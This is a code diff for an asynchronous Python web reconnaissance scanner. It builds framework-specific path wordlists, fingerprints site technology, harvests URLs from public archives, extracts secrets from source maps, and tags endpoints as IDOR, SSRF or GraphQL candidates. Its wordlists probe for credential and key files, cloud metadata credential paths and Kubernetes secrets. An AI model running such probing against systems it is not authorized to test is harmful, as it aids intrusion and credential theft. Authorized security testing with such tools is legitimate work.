+    "api/v1/orders", "api/v1/payments", "api/v1/billing",
+    # SSRF sinks
+    "fetch", "proxy", "webhook", "webhooks", "callback",
+    "forward", "redirect", "link", "preview",
+    "api/v1/fetch", "api/v1/proxy", "api/fetch",
+    "url-preview", "link-preview", "open-graph",
+    # Search / query
+    "search", "find", "query", "filter", "autocomplete",
+    "suggest", "lookup", "scan", "browse",
+    "api/v1/search", "api/v2/search",
+    # Posts / content
+    "posts", "post", "articles", "article", "blog",
+    "comments", "comment", "messages", "message",
+    "feed", "feeds", "inbox", "notifications",
+    "api/v1/posts", "api/v1/comments",
+    # Misc
+    "socket.io/", "ws", "wss",
+    "graphql/schema", "schema",
+    "sitemap", "feed.xml", "atom.xml", "rss.xml",
+    "humans.txt", "security.txt", "manifest.json", "favicon.ico",
+    ".well-known/", "cache", "purge",
+    "share", "invite", "referral",
+    "report", "reports", "analytics", "analytics/",
+    "audit", "audit-log", "activity", "history",
+    "roles", "permissions", "scopes", "grants",
+    "tokens", "api-keys", "keys", "secrets",
+    "integrations", "connectors", "providers",
+    "sessions", "devices", "trusted-devices",
+    "two-factor", "security-settings",
+]
 
-            if "robots" in p:
-                for line in body.splitlines():
-                    line = line.strip()
-                    if line.lower().startswith(("disallow:", "allow:")):
-                        ep = line.split(":", 1)[1].strip()
-                        if ep and ep != "/":
-                            paths.append(ep.lstrip("/"))
-                            info(f"  robots.txt path: {ep}")
+WORDLIST_SPRING = [
+    "actuator", "actuator/", "actuator/health", "actuator/health/liveness",
+    "actuator/health/readiness", "actuator/info", "actuator/env",
+    "actuator/beans", "actuator/mappings", "actuator/metrics",
+    "actuator/httptrace", "actuator/trace", "actuator/loggers",
+    "actuator/logfile", "actuator/threaddump", "actuator/heapdump",
+    "actuator/shutdown", "actuator/refresh", "actuator/restart",
+    "actuator/conditions", "actuator/configprops", "actuator/quartz",
+    "actuator/flyway", "actuator/liquibase", "actuator/caches",
+    "actuator/scheduledtasks", "actuator/integrationgraph",
+    "actuator/prometheus", "actuator/jolokia",
+    "manage/health", "management/health", "spring/health",
+    "console", "h2-console", "h2/", "/console/",
+    "error", "error/500", "error/404",
+    "swagger-ui.html", "swagger-ui/", "v2/api-docs", "v3/api-docs",
+    "webjars/springfox-swagger-ui/",
+]
 
-            if "sitemap" in p:
-                for u in SITEMAP_URL_PAT.findall(body):
-                    parsed = urlparse(u)
-                    if parsed.path and parsed.path != "/":
-                        paths.append(parsed.path.lstrip("/"))
+WORDLIST_LARAVEL = [
+    "telescope", "telescope/", "horizon", "horizon/",
+    "_debugbar", "_ignition", "ignition",
+    "storage/logs/laravel.log", "storage/",
+    "public/storage", "app/Http/Controllers",
+    "artisan", "phpunit.xml", "composer.json", "composer.lock",
+    "bootstrap/cache/config.php", ".env.example",
+    "api/user", "api/login", "api/register", "api/logout",
+    "sanctum/csrf-cookie", "api/sanctum/csrf-cookie",
+    "api/v1/user", "api/v1/auth/login", "api/v1/auth/register",
+    "broadcasting/auth", "pusher/auth",
+]
 
-            if "security" in p:
-                for line in body.splitlines():
-                    if line.strip().startswith("Contact:"):
-                        info(f"  security.txt: {line.strip()}")
+WORDLIST_DJANGO = [
+    "admin/", "admin/login/", "admin/logout/",
+    "__debug__/", "__debug__/sql/", "__debug__/template/",
+    "api-auth/", "api-auth/login/", "api-auth/logout/",
+    "api/schema/", "api/schema/swagger-ui/", "api/schema/redoc/",
+    "djdt/render_panel/", "silk/", "silk/summary/",
+    "accounts/login/", "accounts/logout/", "accounts/register/",
+    "static/", "media/", "favicon.ico",
+    "robots.txt",
+]
 
+WORDLIST_RAILS = [
+    "rails/info", "rails/info/properties", "rails/info/routes",
+    "rails/mailers", "sidekiq", "sidekiq/",
+    "letter_opener", "delayed_job", "resque",
+    "users/sign_in", "users/sign_out", "users/sign_up",
+    "users/password/new", "users/password/edit",
+    "users/confirmation/new", "users/unlock/new",
+    "api/v1/sessions", "api/v1/registrations",
+    "admin/", "admin/login",
+    "/assets/", ".ruby-version", "Gemfile", "Gemfile.lock",
+]
+
+WORDLIST_EXPRESS_NODE = [
+    "api/", "health", "status",
+    "api/v1/health", "api/v1/status",
+    "__webpack_hmr", "webpack-dev-server",
+    ".eslintrc.json", ".eslintrc.js",
+    "package.json", "package-lock.json",
+    "node_modules/", "dist/", "build/",
+    "src/", ".env", ".env.local",
+]
+
+WORDLIST_WORDPRESS = [
+    "wp-admin/", "wp-login.php", "wp-admin/admin-ajax.php",
+    "wp-json/", "wp-json/wp/v2/", "wp-json/wp/v2/users",
+    "wp-json/wp/v2/posts", "wp-json/wp/v2/pages",
+    "wp-content/", "wp-includes/",
+    "xmlrpc.php", "wp-cron.php", "wp-config.php",
+    "wp-config.php.bak", "wp-config.old",
+    "wp-json/wp/v2/users?per_page=100",
+    "?author=1", "?author=2", "?author=3",
+    "feed/", "feed", "comments/feed/",
+    "wp-admin/options-general.php",
+    "wp-admin/user-new.php",
+]
+
+WORDLIST_DRUPAL = [
+    "user/login", "user/register", "user/password",
+    "admin/", "admin/people", "admin/config",
+    "jsonapi/", "jsonapi/user/user",
+    "?q=user/login", "?q=admin",
+    "sites/default/files/", "sites/all/",
+    "CHANGELOG.txt", "LICENSE.txt", "INSTALL.txt",
+    "install.php", "update.php", "cron.php",
+    "modules/", "themes/", "profiles/",
+]
+
+WORDLIST_CLOUD = [
+    # AWS metadata
+    "latest/meta-data/", "latest/meta-data/hostname",
+    "latest/meta-data/iam/security-credentials/",
+    "latest/user-data",
+    # Common cloud paths
+    ".aws/credentials", ".aws/config",
+    "aws-exports.js", "firebase.json",
+    ".firebase/", "google-services.json",
+    "ServiceAccountCredentials.json",
+    "kubeconfig", ".kube/config",
+    # Kubernetes
+    "api/v1/namespaces/default/secrets",
+    "metrics", "healthz",
+]
+
+WORDLIST_SENSITIVE_FILES = [
+    # Backup files
+    "backup.zip", "backup.tar.gz", "backup.sql", "backup.sql.gz",
+    "site.zip", "website.zip", "www.zip", "html.zip",
+    "db.sql", "database.sql", "dump.sql", "data.sql",
+    "app.zip", "application.zip",
+    "*.bak", "index.php.bak", "login.php.bak",
+    # Source / config
+    ".htpasswd", ".htaccess.bak",
+    "config.php.bak", "config.json.bak",
+    "wp-config.php.bak", "settings.php.bak",
+    "application.properties", "application.yml",
+    "appsettings.json", "appsettings.Development.json",
+    "web.config.bak",
+    # Logs
+    "debug.log", "error.log", "access.log",
+    "laravel.log", "php_error.log",
+    "var/log/", "logs/error.log",
+    # Certs / keys
+    "server.key", "private.key", "id_rsa",
+    "certificate.pem", "cert.pem", "privkey.pem",
+    # Source maps
+    "js/app.js.map", "static/js/main.chunk.js.map",
+    "bundle.js.map", "vendor.js.map",
+]
+
+
+def build_wordlist(tech: Set[str]) -> List[str]:
+    paths = list(dict.fromkeys(WORDLIST_GENERAL + WORDLIST_SENSITIVE_FILES))
+    if "spring" in tech:
+        paths += WORDLIST_SPRING
+    if "laravel" in tech:
+        paths += WORDLIST_LARAVEL
+    if "django" in tech:
+        paths += WORDLIST_DJANGO
+    if "rails" in tech:
+        paths += WORDLIST_RAILS
+    if "express" in tech or "node" in tech:
+        paths += WORDLIST_EXPRESS_NODE
+    if "wordpress" in tech:
+        paths += WORDLIST_WORDPRESS
+    if "drupal" in tech:
+        paths += WORDLIST_DRUPAL
     return list(dict.fromkeys(paths))
 
 
-# ── Phase 1: Crawl ────────────────────────────────────────────────────────────────────────────
+# ── HTTP client ───────────────────────────────────────────────────────────────
 
-async def phase_crawl(http: HTTP, max_depth: int = 2,
-                      max_pages: int = 80) -> list[str]:
-    hdr("PHASE 1 — CRAWL (HTML + JS endpoint extraction)")
-    base_host = urlparse(http.base).netloc
-    visited: set[str] = set()
-    queue: list[tuple[str, int]] = [("", 0)]
-    found_paths: set[str] = set()
+class HTTP:
+    def __init__(self, sem, session: aiohttp.ClientSession, verbose=False, delay=0):
+        self.sem = sem
+        self.session = session
+        self.verbose = verbose
+        self.delay = delay
 
-    while queue and len(visited) < max_pages:
-        path, depth = queue.pop(0)
-        abs_url = http.abs(path)
-        if abs_url in visited:
+    async def get(self, url: str, **kw) -> Tuple[int, str, Dict]:
+        return await self._req("GET", url, **kw)
+
+    async def post(self, url: str, **kw) -> Tuple[int, str, Dict]:
+        return await self._req("POST", url, **kw)
+
+    async def options(self, url: str) -> Tuple[int, str, Dict]:
+        return await self._req("OPTIONS", url)
+
+    async def head(self, url: str) -> Tuple[int, str, Dict]:
+        return await self._req("HEAD", url)
+
+    async def _req(self, method: str, url: str, **kw) -> Tuple[int, str, Dict]:
+        if self.delay:
+            await asyncio.sleep(self.delay / 1000)
+        async with self.sem:
+            try:
+                timeout = aiohttp.ClientTimeout(total=12, connect=6)
+                async with self.session.request(method, url, timeout=timeout,
+                                                 allow_redirects=False,
+                                                 ssl=False, **kw) as r:
+                    body = await r.text(errors="replace")
+                    headers = dict(r.headers)
+                    if self.verbose:
+                        sym = G if r.status < 300 else (Y if r.status < 400 else (R if r.status >= 500 else DIM))
+                        print(f"  {sym}{r.status}{RST} {method} {url}")
+                    return r.status, body[:8000], headers
+            except asyncio.TimeoutError:
+                return 0, "", {}
+            except Exception:
+                return 0, "", {}
+
+
+# ── Technology fingerprinting ─────────────────────────────────────────────────
+
+TECH_SIGS = {
+    "spring":    [r"X-Application-Context", r"actuator", r"Whitelabel Error", r"Spring Boot"],
+    "laravel":   [r"laravel_session", r"Laravel", r"X-Powered-By.*PHP", r"XSRF-TOKEN"],
+    "django":    [r"csrftoken", r"Django", r"X-Frame-Options.*SAMEORIGIN", r"__debug__"],
+    "rails":     [r"_session_id", r"Rails", r"X-Runtime", r"X-Powered-By.*Phusion"],
+    "express":   [r"X-Powered-By.*Express", r"connect\.sid"],
+    "fastapi":   [r"FastAPI", r"uvicorn"],
+    "wordpress": [r"WordPress", r"wp-content", r"wp-json", r"PHPSESSID.*wordpress"],
+    "drupal":    [r"Drupal", r"X-Drupal-", r"X-Generator.*Drupal"],
+    "joomla":    [r"Joomla", r"\/joomla\/"],
+    "asp.net":   [r"ASP\.NET", r"__VIEWSTATE", r"X-AspNet-Version", r"X-Powered-By.*ASP"],
+    "php":       [r"X-Powered-By.*PHP", r"PHPSESSID"],
+    "nginx":     [r"nginx"],
+    "apache":    [r"Apache"],
+    "cloudflare":[r"cf-ray", r"cf-cache-status", r"cloudflare"],
+    "akamai":    [r"X-Check-Cacheable", r"Akamai"],
+    "nextjs":    [r"__NEXT_DATA__", r"Next\.js", r"x-nextjs"],
+    "graphql":   [r"application/graphql", r"__typename"],
+    "java":      [r"JSESSIONID", r"java\.lang", r"javax\."],
+    "node":      [r"X-Powered-By.*Node", r"\.js"],
+}
+
+
+async def fingerprint(http: HTTP, base: str) -> Set[str]:
+    tech: Set[str] = set()
+    for path in ["", "/", "robots.txt", "api/", "api/v1/"]:
+        url = f"{base.rstrip('/')}/{path.lstrip('/')}"
+        status, body, headers = await http.get(url)
+        if not status:
             continue
-        visited.add(abs_url)
-
-        s, rhdrs, body, final_url = await http.get(path)
-        if s == 0 or not body:
-            continue
-
-        ct = rhdrs.get("Content-Type", "")
-        is_html = "html" in ct.lower()
-        is_js   = "javascript" in ct.lower() or path.endswith(".js")
-
-        if is_html and body:
-            soup = BeautifulSoup(body, "html.parser")
-
-            for tag in soup.find_all(True):
-                for attr in ("href", "src", "action", "data-url", "data-href"):
-                    val = tag.get(attr, "")
-                    if not val or val.startswith(("#", "mailto:", "tel:", "javascript:")):
-                        continue
-                    p_url = urlparse(val)
-                    if p_url.netloc and p_url.netloc != base_host:
-                        continue
-                    ep = p_url.path.strip("/")
-                    if ep:
-                        found_paths.add(ep)
-                        if depth < max_depth and abs_url not in visited:
-                            queue.append((ep, depth + 1))
-
-            for tag in soup.find_all("script"):
-                src = tag.get("src", "")
-                if src and not urlparse(src).netloc:
-                    ep = src.lstrip("/")
-                    found_paths.add(ep)
-                    if depth < max_depth:
-                        queue.append((ep, depth + 1))
-
-                inline = tag.string or ""
-                for m in JS_ROUTE_PATTERN.finditer(inline):
-                    found_paths.add(m.group(1).lstrip("/"))
-
-        if is_js:
-            for m in JS_ROUTE_PATTERN.finditer(body):
-                ep = m.group(1).lstrip("/")
-                found_paths.add(ep)
-                info(f"  JS endpoint: /{ep}")
-
-    ok(f"Crawl complete: {len(found_paths)} unique paths found")
-    return list(found_paths)
+        all_text = body + " " + " ".join(f"{k}: {v}" for k, v in headers.items())
+        for t, patterns in TECH_SIGS.items():
+            for p in patterns:
+                if re.search(p, all_text, re.I):
+                    tech.add(t)
+    if tech:
+        print(f"  {C}Tech:{RST} {', '.join(sorted(tech))}")
+    return tech
 
 
-# ── Phase 2: Wordlist brute-force ─────────────────────────────────────────────────────────────
+# ── Passive sources ───────────────────────────────────────────────────────────
 
-SKIP_STATUSES = {404, 410, 400}
-
-async def probe_path(http: HTTP, path: str, sem: asyncio.Semaphore,
-                     results: list[Endpoint]):
-    async with sem:
-        s, hdrs, body, final_url = await http.get(path, allow_redirects=False)
-        if s == 0 or s in SKIP_STATUSES:
-            return
-        if not interesting(s, body):
-            return
-
-        redirect = hdrs.get("Location", "")
-        ep = Endpoint(
-            url=http.abs(path),
-            path=path,
-            status=s,
-            tags=tag_from_path(path) | tag_from_response(s, hdrs, body),
-            content_type=hdrs.get("Content-Type", ""),
-            body_sample=body[:400],
-            source="wordlist",
-            redirect_to=redirect,
-        )
-        results.append(ep)
+async def passive_wayback(http: HTTP, host: str) -> List[str]:
+    urls = []
+    try:
+        api = f"https://web.archive.org/cdx/search/cdx?url={host}/*&output=json&fl=original&collapse=urlkey&limit=5000&filter=statuscode:200"
+        status, body, _ = await http.get(api)
+        if status == 200 and body:
+            rows = json.loads(body)
+            for row in rows[1:]:
+                u = row[0] if row else ""
+                if u:
+                    urls.append(u)
+    except Exception:
+        pass
+    print(f"  {DIM}Wayback Machine: {len(urls)} URLs{RST}")
+    return urls
 
 
-async def phase_wordlist(http: HTTP,
-                         extra_paths: list[str] | None = None,
-                         concurrency: int = 40) -> list[Endpoint]:
-    hdr("PHASE 2 — WORDLIST BRUTE-FORCE")
-    all_paths = ALL_WORDLIST_PATHS.copy()
-    if extra_paths:
-        for p in extra_paths:
-            p = p.strip("/")
-            if p not in _seen:
-                all_paths.append(p)
-
-    sem = asyncio.Semaphore(concurrency)
-    results: list[Endpoint] = []
-    tasks = [probe_path(http, p, sem, results) for p in all_paths]
-
-    step(f"Probing {len(tasks)} paths (concurrency={concurrency})")
-    await asyncio.gather(*tasks)
-    ok(f"Wordlist: {len(results)} endpoints returned interesting responses")
-    return results
+async def passive_urlscan(http: HTTP, host: str) -> List[str]:
+    urls = []
+    try:
+        api = f"https://urlscan.io/api/v1/search/?q=domain:{host}&size=1000"
+        status, body, _ = await http.get(api)
+        if status == 200 and body:
+            data = json.loads(body)
+            for result in data.get("results", []):
+                page = result.get("page", {})
+                u = page.get("url", "")
+                if u:
+                    urls.append(u)
+    except Exception:
+        pass
+    print(f"  {DIM}URLScan: {len(urls)} URLs{RST}")
+    return urls
 
 
-# ── Phase 3: Spec discovery ────────────────────────────────────────────────────────────────────────
+async def passive_commoncrawl(http: HTTP, host: str) -> List[str]:
+    urls = []
+    try:
+        api = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url={host}/*&output=json&limit=2000"
+        status, body, _ = await http.get(api)
+        if status == 200 and body:
+            for line in body.splitlines():
+                try:
+                    row = json.loads(line)
+                    u = row.get("url", "")
+                    if u:
+                        urls.append(u)
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    print(f"  {DIM}CommonCrawl: {len(urls)} URLs{RST}")
+    return urls
 
-SWAGGER_PATHS = [
-    "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
-    "api-docs", "api-docs.json", "api/docs", "api/swagger.json",
-    "api/v1/swagger.json", "api/v2/swagger.json",
-    "v1/swagger.json", "v2/swagger.json",
-    "v1/api-docs", "v2/api-docs",
-    "api/openapi.json", "api/v1/openapi.json",
-    ".well-known/api-catalog",
+
+async def passive_otx(http: HTTP, host: str) -> List[str]:
+    urls = []
+    try:
+        api = f"https://otx.alienvault.com/api/v1/indicators/domain/{host}/url_list?limit=500"
+        status, body, _ = await http.get(api)
+        if status == 200 and body:
+            data = json.loads(body)
+            for item in data.get("url_list", []):
+                u = item.get("url", "")
+                if u:
+                    urls.append(u)
+    except Exception:
+        pass
+    print(f"  {DIM}OTX: {len(urls)} URLs{RST}")
+    return urls
+
+
+async def passive_crtsh(http: HTTP, host: str) -> List[str]:
+    subdomains = []
+    try:
+        api = f"https://crt.sh/?q=%.{host}&output=json"
+        status, body, _ = await http.get(api)
+        if status == 200 and body:
+            data = json.loads(body)
+            for entry in data:
+                name = entry.get("name_value", "")
+                for n in name.split("\n"):
+                    n = n.strip().lstrip("*.")
+                    if n and host in n:
+                        subdomains.append(n)
+    except Exception:
+        pass
+    subs = list(set(subdomains))
+    if subs:
+        print(f"  {DIM}crt.sh subdomains: {', '.join(subs[:20])}{'...' if len(subs)>20 else ''}{RST}")
+    return subs
+
+
+def extract_host(base: str) -> str:
+    parsed = urllib.parse.urlparse(base)
+    host = parsed.hostname or ""
+    return re.sub(r"^www\.", "", host)
+
+
+# ── Crawling ──────────────────────────────────────────────────────────────────
+
+JS_PATTERNS = [
+    re.compile(r"""(?:fetch|axios(?:\.\w+)?|http(?:Client)?\.(?:get|post|put|delete|patch|request))\s*\(\s*['"`]([^'"`\s]{2,200})['"`]"""),
+    re.compile(r"""(?:url|endpoint|path|api|baseURL|BASE_URL|API_URL|apiUrl|apiPath)\s*[:=]\s*['"`]([/][^'"`\s]{1,200})['"`]"""),
+    re.compile(r"""['"`](/(?:api|v\d|rest|graphql|auth|users?|admin)[^'"`\s]{0,150})['"`]"""),
+    re.compile(r"""routes?\.(?:get|post|put|delete|patch|use)\s*\(\s*['"`]([^'"`\s]{2,200})['"`]"""),
+    re.compile(r"""path\s*:\s*['"`]([/][^'"`\s]{1,200})['"`]"""),
+    re.compile(r"""href\s*=\s*['"]([/][^'"]{1,200})['"]"""),
+    re.compile(r"""action\s*=\s*['"]([/][^'"]{1,200})['"]"""),
 ]
 
-GRAPHQL_PATHS = ["graphql", "graphiql", "api/graphql", "v1/graphql",
-                 "api/v1/graphql", "api/v2/graphql", "query"]
+SOURCEMAP_SECRET = re.compile(
+    r"""(?:api[_-]?key|secret|password|token|auth|credential|private[_-]?key|access[_-]?key|aws[_-]?key|bearer)\s*[:=]\s*['"`]([A-Za-z0-9+/=_\-]{8,80})['"`]""",
+    re.I
+)
 
-GRAPHQL_INTROSPECT = """{"query":"{ __schema { types { name fields { name } } } }"}"""
+
+async def crawl(http: HTTP, base: str, depth: int = 3) -> Tuple[List[str], List[str]]:
+    visited: Set[str] = set()
+    found_paths: List[str] = []
+    found_js: List[str] = []
+    queue = [base]
+    parsed_base = urllib.parse.urlparse(base)
+
+    for _ in range(depth):
+        next_queue = []
+        tasks = [http.get(u) for u in queue if u not in visited]
+        visited.update(queue)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        for url, result in zip([u for u in queue if u not in visited], results):
+            if isinstance(result, Exception):
+                continue
+            status, body, headers = result
+            if not body:
+                continue
+
+            ct = headers.get("Content-Type", "")
+            if "javascript" in ct or url.endswith(".js"):
+                for pat in JS_PATTERNS:
+                    for m in pat.findall(body):
+                        p = m.strip()
+                        if p.startswith("/") or p.startswith("http"):
+                            found_paths.append(p)
+                # source map check
+                if "//# sourceMappingURL=" in body:
+                    sm = re.search(r"//# sourceMappingURL=(.+\.map)", body)
+                    if sm:
+                        map_url = urllib.parse.urljoin(url, sm.group(1))
+                        found_js.append(map_url)
+                continue
+
+            soup = BeautifulSoup(body, "lxml")
+            for tag in soup.find_all(["a", "form", "link", "script", "img", "iframe", "button"]):
+                href = tag.get("href") or tag.get("src") or tag.get("action") or ""
+                if not href or href.startswith(("mailto:", "tel:", "javascript:", "#")):
+                    continue
+                abs_url = urllib.parse.urljoin(url, href)
+                p_url = urllib.parse.urlparse(abs_url)
+                if p_url.hostname != parsed_base.hostname:
+                    continue
+                path = p_url.path
+                if path and path not in found_paths:
+                    found_paths.append(path)
+                if abs_url not in visited and abs_url not in next_queue:
+                    next_queue.append(abs_url)
+
+            # Extract inline JS paths
+            for script in soup.find_all("script"):
+                src = script.get("src", "")
+                if src:
+                    js_url = urllib.parse.urljoin(url, src)
+                    if js_url not in visited:
+                        next_queue.append(js_url)
+                code = script.string or ""
+                if code:
+                    for pat in JS_PATTERNS:
+                        for m in pat.findall(code):
+                            if m.startswith("/"):
+                                found_paths.append(m)
+
+            # Next.js __NEXT_DATA__
+            next_data = soup.find("script", id="__NEXT_DATA__")
+            if next_data and next_data.string:
+                try:
+                    nd = json.loads(next_data.string)
+                    routes = _extract_nextjs_routes(nd)
+                    found_paths.extend(routes)
+                except Exception:
+                    pass
+
+        queue = list(dict.fromkeys(next_queue))[:200]
+
+    return list(dict.fromkeys(found_paths)), found_js
 
 
-async def phase_spec(http: HTTP) -> list[Endpoint]:
-    hdr("PHASE 3 — SPEC DISCOVERY (Swagger / OpenAPI / GraphQL)")
-    found: list[Endpoint] = []
+def _extract_nextjs_routes(obj, depth=0) -> List[str]:
+    if depth > 6:
+        return []
+    routes = []
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            if k in ("page", "pathname", "route", "href", "as") and isinstance(v, str) and v.startswith("/"):
+                routes.append(v)
+            routes.extend(_extract_nextjs_routes(v, depth+1))
+    elif isinstance(obj, list):
+        for item in obj:
+            routes.extend(_extract_nextjs_routes(item, depth+1))
+    return routes
 
-    for path in SWAGGER_PATHS:
-        s, hdrs, body, _ = await http.get(path)
-        if s != 200 or not body:
+
+async def fetch_sourcemap(http: HTTP, map_url: str) -> Tuple[List[str], List[str]]:
+    paths = []
+    secrets = []
+    status, body, _ = await http.get(map_url)
+    if status != 200 or not body:
+        return paths, secrets
+    try:
+        data = json.loads(body)
+        sources = data.get("sources", []) or data.get("sourceRoot", [])
+        for src in (sources if isinstance(sources, list) else [sources]):
+            if isinstance(src, str):
+                paths.append(src)
+        content = " ".join(data.get("sourcesContent", []) or [])
+        for m in SOURCEMAP_SECRET.finditer(content):
+            secrets.append(f"[SOURCEMAP SECRET] {m.group(0)[:120]}")
+        for pat in JS_PATTERNS:
+            for m in pat.findall(content):
+                if m.startswith("/"):
+                    paths.append(m)
+    except Exception:
+        pass
+    return paths, secrets
+
+
+# ── Spec parsing ──────────────────────────────────────────────────────────────
+
+async def parse_openapi(http: HTTP, base: str) -> List[Endpoint]:
+    endpoints = []
+    spec_paths = [
+        "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
+        "api-docs", "api/docs", "api/v1/swagger.json", "api/v2/swagger.json",
+        "api/v1/openapi.json", "v2/api-docs", "v3/api-docs",
+        "api/swagger.json", "api/openapi.json",
+    ]
+    for sp in spec_paths:
+        url = f"{base.rstrip('/')}/{sp}"
+        status, body, _ = await http.get(url)
+        if status != 200 or not body:
             continue
         try:
             spec = json.loads(body)
         except Exception:
-            continue
-        if not isinstance(spec, dict):
-            continue
-        if not any(k in spec for k in ("paths", "openapi", "swagger")):
-            continue
+            try:
+                import yaml
+                spec = yaml.safe_load(body)
+            except Exception:
+                continue
 
-        ok(f"OpenAPI spec found: /{path}")
-        spec_paths = spec.get("paths", {})
-        for sp, methods in spec_paths.items():
-            for method in methods.keys():
-                method = method.upper()
-                if method in ("GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"):
-                    ep_path = sp.lstrip("/")
-                    ep = Endpoint(
-                        url=http.abs(ep_path),
-                        path=ep_path,
-                        status=0,
-                        methods=[method],
-                        tags=tag_from_path(ep_path),
-                        source="spec",
-                    )
-                    params = methods.get(method.lower(), {}).get("parameters", [])
-                    for param in params:
-                        pname = param.get("name", "")
-                        pin   = param.get("in", "")
-                        if pin == "path" and re.search(r"id|uuid|key", pname, re.I):
-                            ep.tags.add("IDOR")
-                        if pin == "query" and re.search(r"url|uri|redirect|target", pname, re.I):
-                            ep.tags.add("SSRF")
-                            ep.tags.add("OPEN_REDIRECT")
-                    found.append(ep)
-
-        if spec_paths:
-            ok(f"  Extracted {len(spec_paths)} paths from spec")
-            spec_ep = Endpoint(url=http.abs(path), path=path, status=200,
-                               tags={"INFO_DISC"}, source="spec",
-                               body_sample=body[:200])
-            found.append(spec_ep)
+        prefix = spec.get("basePath", "") or ""
+        for path, methods in (spec.get("paths") or {}).items():
+            full_path = f"{prefix}{path}".lstrip("/")
+            ep = Endpoint(
+                url=f"{base.rstrip('/')}/{full_path}",
+                path=full_path,
+                source="spec",
+            )
+            # tag by path
+            for pat, tags in TAG_RULES:
+                if pat.search(path):
+                    ep.tags.update(tags)
+            # inspect parameters
+            all_params = []
+            for method, mdata in methods.items():
+                if not isinstance(mdata, dict):
+                    continue
+                ep.methods.append(method.upper())
+                for param in mdata.get("parameters", []):
+                    pname = param.get("name", "")
+                    ploc = param.get("in", "")
+                    all_params.append(pname)
+                    if PARAM_SSRF.match(pname):
+                        ep.tags.add("SSRF"); ep.tags.add("OPEN_REDIRECT")
+                        ep.notes.append(f"Param ?{pname}= → SSRF/redirect sink")
+                    if PARAM_IDOR.match(pname):
+                        ep.tags.add("IDOR")
+                        ep.notes.append(f"Param {pname} (in {ploc}) → IDOR candidate")
+                    if PARAM_INJECT.match(pname):
+                        ep.tags.add("INJECTION")
+            ep.params = all_params
+            # path params like {id}
+            if re.search(r"\{(id|uuid|user_id|account_id)\}", path, re.I):
+                ep.tags.add("IDOR")
+            endpoints.append(ep)
+        print(f"  {G}OpenAPI spec:{RST} {url} → {len(endpoints)} endpoints")
         break
+    return endpoints
 
-    for path in GRAPHQL_PATHS:
-        s, hdrs, body = await http.post(path, raw=GRAPHQL_INTROSPECT.encode(),
-                                         ct="application/json")
-        if s not in (200, 400):
+
+async def parse_graphql(http: HTTP, base: str) -> List[Endpoint]:
+    endpoints = []
+    introspection = {
+        "query": """
+        { __schema { types { name kind fields { name type { name kind } } }
+          queryType { name } mutationType { name } subscriptionType { name } } }
+        """
+    }
+    for gql_path in ["graphql", "gql", "api/graphql", "graph", "graphql/", "api/v1/graphql"]:
+        url = f"{base.rstrip('/')}/{gql_path}"
+        status, body, _ = await http.post(url, json=introspection,
+                                           headers={"Content-Type": "application/json"})
+        if status != 200 or not body:
             continue
         try:
-            resp = json.loads(body)
-        except Exception:
-            continue
-
-        if "data" in resp and "__schema" in str(resp):
-            ok(f"GraphQL introspection enabled: /{path}")
-            ep = Endpoint(url=http.abs(path), path=path, status=s,
-                          tags={"GRAPHQL", "INFO_DISC"},
-                          source="spec",
-                          body_sample=body[:400])
-            ep.notes.append("Introspection enabled — full schema exposed")
-
-            types = []
-            try:
-                types = resp["data"]["__schema"]["types"]
-            except (KeyError, TypeError):
-                pass
-            for t in types:
-                if t.get("name","").startswith("_"):
-                    continue
-                fields = t.get("fields") or []
-                for f in fields:
-                    fname = f.get("name","")
-                    if re.search(r"(password|secret|token|ssn|key|flag|admin)", fname, re.I):
-                        ep.notes.append(f"Sensitive field: {t['name']}.{fname}")
-                        ep.tags.add("INFO_DISC")
-                    if re.search(r"(delete|remove|update|create|set|add|modify)", fname, re.I):
-                        ep.tags.add("ADMIN")
-            found.append(ep)
+            data = json.loads(body)
+            schema = data.get("data", {}).get("__schema", {})
+            if not schema:
+                continue
+            ep = Endpoint(url=url, path=gql_path, status=200, source="graphql")
+            ep.tags.add("GRAPHQL")
+            ep.notes.append("GraphQL introspection ENABLED")
+            # Check for sensitive field names
+            sensitive = re.compile(r"password|secret|token|ssn|key|flag|admin|credit|card|cvv|pin|private", re.I)
+            mutations = []
+            for t in schema.get("types", []):
+                if t.get("kind") == "OBJECT" and not t.get("name", "").startswith("__"):
+                    for f in (t.get("fields") or []):
+                        fname = f.get("name", "")
+                        if sensitive.search(fname):
+                            ep.tags.add("INFO_DISC")
+                            ep.notes.append(f"Sensitive GraphQL field: {t['name']}.{fname}")
+            if schema.get("mutationType"):
+                ep.tags.add("ADMIN")
+                ep.notes.append("GraphQL mutations available — test for privilege escalation")
+            endpoints.append(ep)
+            print(f"  {R}GraphQL introspection:{RST} {url}")
             break
+        except Exception:
+            pass
+    return endpoints
 
+
+# ── Probing ───────────────────────────────────────────────────────────────────
+
+def interesting(status: int, body: str) -> bool:
+    return status in (200, 201, 204, 206, 301, 302, 307, 308, 400, 401, 403, 405, 422, 500)
+
+
+async def probe_paths(http: HTTP, base: str, paths: List[str]) -> List[Endpoint]:
+    base = base.rstrip("/")
+    found: List[Endpoint] = []
+
+    async def check(path: str):
+        path = path.lstrip("/")
+        url = f"{base}/{path}"
+        status, body, headers = await http.get(url)
+        if not interesting(status, body):
+            return
+        ep = Endpoint(
+            url=url, path=path, status=status,
+            content_type=headers.get("Content-Type", ""),
+            body_sample=body[:300],
+            source="wordlist",
+            response_headers=headers,
+            response_size=len(body),
+        )
+        ep.redirect_to = headers.get("Location", "")
+        for pat, tags in TAG_RULES:
+            if pat.search("/" + path):
+                ep.tags.update(tags)
+        # Security header analysis
+        _check_security_headers(ep, headers)
+        found.append(ep)
+
+    sem_batch = asyncio.Semaphore(min(len(paths), 50))
+    async def sem_check(p):
+        async with sem_batch:
+            await check(p)
+
+    await asyncio.gather(*[sem_check(p) for p in paths])
     return found
 
 
-# ── Phase 4: Triage (deduplicate + score) ───────────────────────────────────────────────────────
-
-def triage(endpoints: list[Endpoint]) -> list[Endpoint]:
-    seen: dict[str, Endpoint] = {}
-    for ep in endpoints:
-        key = ep.path.rstrip("/").lower()
-        if key not in seen:
-            seen[key] = ep
-        else:
-            seen[key].tags |= ep.tags
-            seen[key].methods = list(set(seen[key].methods + ep.methods))
-            if not seen[key].status and ep.status:
-                seen[key].status = ep.status
